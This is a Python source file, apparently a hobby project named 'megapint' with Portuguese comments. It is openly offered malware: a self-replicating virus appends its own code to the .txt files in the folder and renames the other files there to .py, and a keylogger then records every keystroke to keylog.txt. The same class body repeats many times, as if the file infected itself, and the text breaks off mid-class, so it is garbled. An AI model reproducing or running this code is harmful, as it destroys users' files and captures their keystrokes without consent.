    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
